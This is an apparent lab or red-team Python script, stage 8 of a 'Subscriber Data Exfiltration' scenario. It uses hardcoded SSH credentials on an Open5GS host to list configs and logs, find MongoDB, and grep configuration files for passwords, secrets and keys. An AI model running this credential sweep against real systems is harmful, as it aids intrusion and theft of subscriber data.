#!/usr/bin/env python3
"""
Stage 8 — File and Directory Discovery
Scenario 2: Subscriber Data Exfiltration

Goal: from the SSH foothold established in Stage 7, locate configuration
files, the subscriber database, and any accidentally-exposed credentials.
"""

import subprocess

TARGET = "192.168.134.128"
USERNAME = "netops"
PASSWORD = "Summer2024!"

def run_remote(command):
    """Run a command on the target over SSH, return its stdout."""
    result = subprocess.run(
        ["sshpass", "-p", PASSWORD, "ssh",
         "-o", "StrictHostKeyChecking=no",
         f"{USERNAME}@{TARGET}", command],
        capture_output=True, text=True
    )
    return result.stdout.strip()

def main():
    print("[*] Stage 8 - File and Directory Discovery\n")

    print("[*] Open5GS config files:")
    print(run_remote("ls -la /etc/open5gs/"))

    print("\n[*] Open5GS log files:")
    print(run_remote("ls -la /var/log/open5gs/"))

    print("\n[*] Checking for MongoDB process and config:")
    print(run_remote("ps aux | grep -i mongo"))

    print("\n[*] Sweeping configs for exposed credentials/secrets:")
    print(run_remote("grep -ri 'password\\|secret\\|key' /etc/open5gs/*.yaml 2>/dev/null | head -20"))

    print("\n[*] WebUI state directory (if present):")
    print(run_remote("ls -la /var/lib/webui/ 2>/dev/null"))

if __name__ == "__main__":
    main()
